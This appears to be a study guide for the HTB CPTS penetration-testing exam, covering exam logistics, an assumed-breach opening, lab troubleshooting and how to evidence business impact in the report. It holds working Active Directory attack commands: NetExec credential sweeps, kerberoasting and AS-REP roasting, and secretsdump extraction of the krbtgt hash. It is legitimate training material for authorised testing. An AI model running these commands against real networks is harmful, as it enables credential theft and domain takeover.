# Exam Mechanics — Logistics, Opening Play, Proving Impact

> **Purpose:** The non-technical half of passing. Every other file in this suite tells you *how to attack*. This one covers the exam as a system — the clock, the panel, the opening move from provided credentials, what to do when infrastructure breaks, and how to prove business impact so the report scores.
>
> **Read this before Day 0.** The technique files are useless if you burn Day 1 on VPN issues or reach Day 10 with root on everything and no impact evidence.

---

## Phase 0: Confirm the Rules Before the Clock Starts

**Do not take these numbers from any third-party blog, including this file.** Exam parameters change between cohorts. Open your HTB exam portal on Day 0 and fill this table in yourself — it takes five minutes and it is the single highest-leverage thing you can do before starting.

| Parameter | Where to confirm | Your value |
|---|---|---|
| Total flags available | Exam portal / exam brief | `____` |
| Flags required to pass | Exam brief | `____` |
| Report required to pass? | Exam brief (expect **yes** — it is weighted heavily) | `____` |
| Exam window length | Portal countdown (CPTS is a **10-day** window) | `____` |
| Report submission deadline | Portal — confirm whether report time is **inside** or **on top of** the exam window | `____` |
| Clock behaviour | Confirm whether the countdown is **continuous wall-clock** or pausable | `____` |
| Retake / second-attempt policy | Portal + your voucher terms | `____` |
| Report format accepted | PDF expected — confirm max size and naming | `____` |

> **The single most common structural mistake:** assuming the report window is extra time on top of the hacking window. If the 10 days *include* report writing, Day 8 is a hard stop for exploitation, not a suggestion. Confirm this on Day 0 and write the real dates on paper.

> **Grading reality:** CPTS is graded as a professional engagement, not a CTF. A candidate with every flag and a thin report can fail. A candidate who misses a flag but documents a clean, reproducible attack chain with business impact generally does not. Optimise for the report — see [Phase 4](#phase-4-proving-impact-the-part-that-scores) and [reporting/README.md](reporting/README.md).

---

## Phase 1: Pre-Flight (Day 0)

```bash
# 1. VPN — connect and prove routing BEFORE the clock starts
sudo openvpn <EXAM_PACK>.ovpn
ip a show tun0                              # confirm tun0 has an address
ping -c2 <GATEWAY_OR_KNOWN_HOST>            # confirm the lab is reachable

# 2. Pin your source IP — some exams scope by tester IP
ip -4 addr show tun0 | awk '/inet/{print $2}'
# Write this down. If it changes on reconnect, note the new one in your log.

# 3. Confirm scope in writing
#    In-scope subnets/hosts  → your notes, Node 1
#    Out-of-scope hosts      → your notes, in RED
#    Touching an out-of-scope host can end the exam. Re-read the brief twice.

# 4. Working directory + notes (see README.md Day 0 block)
mkdir -p ~/cpts-exam/{recon,loot,creds,screenshots,report}

# 5. Clock discipline — write the real calendar dates, not "Day N"
#    Start:            <YYYY-MM-DD HH:MM>
#    Stop exploiting:  <YYYY-MM-DD>       ← from Phase 0 table
#    Report due:       <YYYY-MM-DD HH:MM>
```

### Pwnbox vs. your own Kali

| | Pwnbox | Local Kali |
|---|---|---|
| Setup time | Zero | Already done if you followed Day 0 |
| Tooling | Pre-pinned, known-good | Yours — verified in [README.md](README.md) Day 0 |
| Session limits | Time-limited; resets lose local state | None |
| GPU cracking | No | Yes — your RTX 4050 via hashcat OpenCL |
| Notes/loot persistence | Must exfil before reset | Native |
| Failure mode | Session dies → lose unsaved work | VPN/host issues are yours to fix |

> **Recommendation:** run local Kali as primary (you keep GPU cracking and persistent loot), and keep Pwnbox as a **fallback** for the case where your local tooling breaks mid-exam. Verify both work on Day 0 — discovering Pwnbox needs a different VPN pack on Day 6 is a bad afternoon.

---

## Phase 2: The Assumed-Breach Opening (First 30 Minutes)

CPTS-style enterprise exams typically hand you **starting credentials** or a low-privilege foothold rather than a pure black-box perimeter. The suite's black-box ladder lives in [README.md](README.md) → *"I need a foothold — no creds yet"*. This is the parallel play for when you **start with creds** — it is a different opening and running the black-box ladder first wastes hours.

```bash
# ── Minute 0-5: establish where you are ──────────────────────────────
export U='<USER>' P='<PASS>' D='<DOMAIN>' DC='<DC_IP>'
export SUB='<SUBNET>/24'

# Do the creds work at all, and where?
nxc smb $SUB -u "$U" -p "$P"                       # look for [+] and (Pwn3d!)

# ── Minute 5-10: policy before any spraying ──────────────────────────
nxc smb $DC -u "$U" -p "$P" --pass-pol              # lockout threshold FIRST
# Write the threshold down. Never exceed N-1 attempts per account.

# ── Minute 10-15: breadth — every protocol, whole subnet ─────────────
for proto in smb winrm rdp mssql ssh ldap; do
  echo "=== $proto ==="
  nxc $proto $SUB -u "$U" -p "$P" 2>/dev/null | grep -E '\[\+\]|Pwn3d'
done
# (Pwn3d!) anywhere = local admin = immediate lateral move, take it now.

# ── Minute 15-20: shares and readable data ───────────────────────────
nxc smb $SUB -u "$U" -p "$P" --shares
nxc smb $SUB -u "$U" -p "$P" -M spider_plus         # NetExec >= 1.5.1 (see README Day 0)

# ── Minute 20-30: AD graph + free hashes ─────────────────────────────
bloodhound-ce-python -d "$D" -u "$U" -p "$P" -dc "$DC" -ns "$DC" -c All --zip
nxc ldap $DC -u "$U" -p "$P" --asreproast asrep.txt
nxc ldap $DC -u "$U" -p "$P" --kerberoasting kerb.txt
# Start hashcat on anything captured, in the BACKGROUND, then keep enumerating.
```

**Then branch:**

| What you found in the first 30 min | Go to |
|---|---|
| `(Pwn3d!)` on any host | [windows-methodology.md](windows-methodology.md) Phase 5 (lateral) → dump creds → repeat |
| Kerberoastable SPNs | [password-cracking.md](password-cracking.md) (`-m 13100`) — background it, keep moving |
| ASREP-roastable users | [password-cracking.md](password-cracking.md) (`-m 18200`) — background it |
| Readable shares with configs/scripts | [enumeration-methodology.md](enumeration-methodology.md) Phase 4 — grep for secrets |
| BloodHound path to DA | [bloodhound-guide.md](bloodhound-guide.md) → edge-to-action map |
| Nothing — creds are low-value | [active-directory-methodology.md](active-directory-methodology.md) Phase 2 (authenticated enum), then ACL hunting |

> **Trap:** with valid creds in hand it is tempting to go straight for a BloodHound DA path. Do the **breadth sweep first** (all protocols, whole subnet). A single `(Pwn3d!)` found in minute 12 can collapse the whole exam, and you will not see it if you tunnel into the graph immediately.

> **Log every credential the moment you get it.** Source, value, and what it opened. See [reporting/cherrytree-structure.md](reporting/cherrytree-structure.md) credential table — back-filling this on Day 9 is how people lose findings.

---

## Phase 3: When Infrastructure Breaks

Exam time is continuous. A hung box burning four hours is four hours gone. Triage in this order.

| Symptom | First check | Fix |
|---|---|---|
| Whole lab unreachable | `ip a show tun0`, `ping <GATEWAY>` | Reconnect VPN. Confirm your tun0 IP — it may have changed. |
| One host stopped responding | Is it *you*? Check your own scan volume | Back off, wait 2-3 min. Aggressive `--min-rate` can wedge a service. |
| Host still dead after backoff | Other hosts reachable? | Use the exam panel's **reset/revert** for that host. Note the time in your log. |
| Kerberos: `KRB_AP_ERR_SKEW` | `date` vs DC time | `sudo ntpdate <DC_IP>` — **always re-sync after any revert** |
| Service back but your shell died | — | Re-establish foothold; your documented chain should make this fast |
| Panel reset doesn't help | — | Contact HTB support **early**, not on Day 9. Keep the ticket reference. |

```bash
# Post-revert reflex — run these three every single time
sudo ntpdate <DC_IP>                   # clock skew kills Kerberos silently
ping -c2 <TARGET>                      # confirm actually back
nxc smb <TARGET> -u "$U" -p "$P"       # confirm creds still valid
```

> **Reverts wipe your foothold.** Before requesting one, make sure your notes contain the *exact* command chain that got you in. If re-exploitation is non-deterministic, dump anything you still need from the host first.

> **Document the downtime.** "Host X was reverted at 14:20 after becoming unresponsive" belongs in your activity log. It explains gaps in your timeline to a grader.

---

## Phase 4: Proving Impact (The Part That Scores)

Getting Domain Admin is the *technical* finish. It is not the *reporting* finish. Graders assess whether you demonstrated **business consequence** — what an attacker could actually do to this organisation. This is the most commonly under-done part of an otherwise strong exam.

Once you hold DA / root on the objective, spend a deliberate 30-45 minutes collecting impact evidence **before** you move on.

### 4.1 Establish the level of control

```bash
# Domain — prove replication rights, don't dump the whole NTDS into your report
impacket-secretsdump '<DOMAIN>/<USER>@<DC>' -just-dc-user krbtgt
# Screenshot: the krbtgt line ONLY. That single hash proves total domain control.
# Do NOT paste thousands of hashes into a report — it is noise, not evidence.

# Confirm privileged group membership
net group "Domain Admins" /domain
```

### 4.2 Reach the actual crown jewels

DA is a means. Find what the business would care about losing:

```bash
# Where is the sensitive data?
nxc smb <SUBNET>/24 -u '<USER>' -p '<PASS>' --shares          # now as DA — new shares appear
nxc smb <SUBNET>/24 -u '<USER>' -p '<PASS>' -M spider_plus

# Databases — the usual real objective
nxc mssql <SUBNET>/24 -u '<USER>' -p '<PASS>' -q "SELECT name FROM sys.databases"

# File-share sweep for regulated / sensitive data classes
grep -riE 'ssn|social security|passport|iban|card number|salary|payroll|confidential' /mnt/<SHARE> 2>/dev/null | head
```

| Impact class | What to capture | Why it scores |
|---|---|---|
| Total domain control | `krbtgt` hash line, DA group membership | Proves persistence + full identity forgery |
| Sensitive data access | Directory listing + **one redacted sample** file | Turns "I got admin" into "PII was exposed" |
| Business system control | Screenshot of the app/DB as admin | Ties compromise to a named business function |
| Credential sprawl | Count of unique creds recovered + reuse map | Demonstrates blast radius beyond one host |
| Pivot reach | Subnets reachable post-compromise | Shows segmentation failure |

> **Handle real data carefully even in a lab.** Screenshot a *file listing* and one clearly-redacted excerpt to prove access. Do not bulk-exfiltrate datasets — it does not add points, it bloats the report, and it is the wrong habit to build for real engagements where it may breach your RoE.

### 4.3 Write the impact sentence while it is fresh

For every finding, write one plain sentence a non-technical executive would understand, at the moment you achieve it:

```text
Template:  Because <WEAKNESS>, an attacker with <STARTING POSITION> could <ACTION>,
           resulting in <BUSINESS CONSEQUENCE>.

Example:   Because the SQL service account had an SPN and a weak password, an attacker
           with any domain account could recover its password offline and gain
           administrative access to the finance database, exposing payroll records
           for all employees.
```

That sentence becomes the `impact` field in [reporting/README.md](reporting/README.md)'s finding schema. Writing it on Day 9 from memory produces vague filler; writing it at the moment of exploitation produces specifics.

---

## Phase 5: Submission

```text
Day 8   — Stop exploiting (per your Phase 0 dates). Findings drafted, all evidence in.
Day 9   — Full technical write-up. Every finding: repro steps, evidence, impact, remediation.
Day 10  — Executive summary LAST. Render PDF. Review. Re-render. Submit with buffer.
```

**Pre-submission checklist:**

- [ ] Every finding has: title, CVSS vector, affected components, repro steps, evidence, impact, remediation
- [ ] Every screenshot is legible and shows the host/IP context
- [ ] The attack chain reads end-to-end — a grader can follow foothold → DA without gaps
- [ ] Failed attempts documented in methodology (shows rigour, explains time spent)
- [ ] Executive summary is non-technical and written last
- [ ] PDF renders correctly — no broken images, no clipped code blocks
- [ ] Flags submitted in the panel **and** referenced in the report
- [ ] Submitted with hours to spare, not minutes

> **Do not submit at the deadline.** Rendering fails, uploads fail, PDFs clip. Target submission a half-day early and use the remainder to re-read.

---

## Quick Reference

| Situation | Action |
|---|---|
| Day 0, before anything | Fill the [Phase 0](#phase-0-confirm-the-rules-before-the-clock-starts) table from the portal |
| Handed starting creds | [Phase 2](#phase-2-the-assumed-breach-opening-first-30-minutes) — breadth sweep before graph |
| Pure black-box start | [README.md](README.md) → "I need a foothold — no creds yet" |
| Host unresponsive | [Phase 3](#phase-3-when-infrastructure-breaks) — backoff → revert → re-sync clock |
| Just got DA / root | [Phase 4](#phase-4-proving-impact-the-part-that-scores) — 30-45 min impact collection |
| 90 min, no progress | Switch boxes ([README.md](README.md) 90-minute rule) |
| Day 8 | Stop exploiting. Start writing. |

---

## Cross-References

- [README.md](README.md) — Day 0 tooling setup, decision trees, black-box foothold ladder
- [pentest-process.md](pentest-process.md) — engagement lifecycle, evidence discipline, chained walkthrough
- [reporting/README.md](reporting/README.md) — SysReptor flow, finding schema, capture cadence
- [reporting/screenshot-guide.md](reporting/screenshot-guide.md) — what to capture at each phase
- [enumeration-methodology.md](enumeration-methodology.md) — Phase 4 credential reuse
- [active-directory-methodology.md](active-directory-methodology.md) — Phase 2 authenticated enumeration onward
